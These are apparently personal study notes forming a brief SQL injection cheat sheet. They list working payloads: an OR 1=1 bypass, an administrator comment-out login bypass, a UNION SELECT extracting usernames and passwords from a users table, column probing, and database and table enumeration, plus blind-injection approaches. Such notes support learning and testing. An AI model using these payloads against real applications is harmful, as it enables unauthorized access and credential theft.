---

[[SQL injection cheat sheet]]

---

+OR+1=1—

administrator’—  
’ Union Select username , password From users—

Second order injection - stored injection

## Using UNION keyword

the already existing output and the output that this returns should be of the same type and it should return the same number of columns

to determine the number of columns - > ‘ Union select null—

to select default database -`' UNION SELECT NULL FROM DUAL--`

payload format - `' UNION SELECT 'a',NULL,NULL,NULL--`

## Identifying database Types

Select * from v$version - for oracle

  

## Database tables listing

select * from information_schema.tables

  

## Blind SQL Injection

- check for errors by using ‘

- perform time delay in operations

- out-of-band network interaction, using OAST techniques